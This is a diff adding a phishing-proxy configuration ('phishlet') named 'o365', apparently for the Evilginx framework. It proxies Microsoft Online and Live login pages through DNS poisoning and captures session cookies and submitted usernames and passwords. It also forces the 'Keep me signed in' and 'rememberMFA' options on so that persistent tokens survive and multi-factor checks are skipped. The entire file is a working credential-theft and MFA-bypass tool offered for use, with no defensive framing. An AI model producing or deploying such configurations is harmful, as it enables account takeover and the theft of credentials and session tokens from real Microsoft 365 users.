@@ -1,0 +1,80 @@
+name: 'o365'
+author: '@nac-tap'
+min_ver: '3.0.0'
+
+# DNS Poisoning Configuration
+# For transparent MITM: phish_sub MUST match orig_sub
+proxy_hosts:
+  - { phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true, auto_filter: false }
+  - { phish_sub: 'account', orig_sub: 'account', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: 'account', orig_sub: 'account', domain: 'live.com', session: false, is_landing: false, auto_filter: false }
+
+sub_filters:
+  # Microsoft domain handling for DNS poisoning
+  - { triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'] }
+  - { triggers_on: 'login.microsoftonline.com', orig_sub: 'account', domain: 'microsoft.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'] }
+  - { triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'live.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'] }
+  - { triggers_on: 'account.microsoft.com', orig_sub: 'login', domain: 'microsoftonline.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'] }
+  - { triggers_on: 'login.live.com', orig_sub: 'login', domain: 'microsoftonline.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'] }
+
+# Capture critical session cookies and tokens
+auth_tokens:
+  # Microsoft Online session cookies
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH:always', 'ESTSAUTHPERSISTENT:always', 'SignInStateCookie:always', 'esctx:always', 'ESTSSC:always', 'ESTSAUTHLIGHT:always', 'stsservicecookie:always']
+    type: 'cookie'
+  
+  - domain: '.microsoftonline.com'
+    keys: ['ESTSAUTH:always', 'ESTSAUTHPERSISTENT:always', 'ESTSSC:always']
+    type: 'cookie'
+  
+  # Microsoft Live account cookies
+  - domain: '.login.live.com'
+    keys: ['MSPAuth:always', 'MSPOK:always', 'NAP:always', 'WLSSC:always', 'MSPRequ:always', 'MSCC:always']
+    type: 'cookie'
+  
+  - domain: '.live.com'
+    keys: ['RPSSecAuth:always', 'MSPAuth:always', 'WLSSC:always', 'NAP:always']
+    type: 'cookie'
+
+# Force "Keep me signed in" to capture persistent tokens
+force_post:
+  - path: '/kmsi*'
+    search: 
+      - { key: 'LoginOptions', search: '.*' }
+    force:
+      - { key: 'LoginOptions', value: '1' }
+    type: 'post'
+  
+  - path: '/common/SAS*'
+    search: 
+      - { key: 'rememberMFA', search: '.*' }
+    force:
+      - { key: 'rememberMFA', value: 'true' }
+    type: 'post'
+
+# Authentication URL patterns to monitor
+auth_urls:
+  - "/kmsi*"
+  - "/common/oauth2/*"
+  - "/common/login*"
+  - "/ppsecure/*"
+
+# Credential capture (username/password)
+credentials:
+  username:
+    key: '(login|username|email|loginfmt)'
+    search: '(.*)'
+    type: 'post'
+  
+  password:
+    key: '(passwd|password|pwd)'
+    search: '(.*)'
+    type: 'post'
+
+# Login page configuration
+login:
+  domain: "login.microsoftonline.com"
+  path: "/"
+
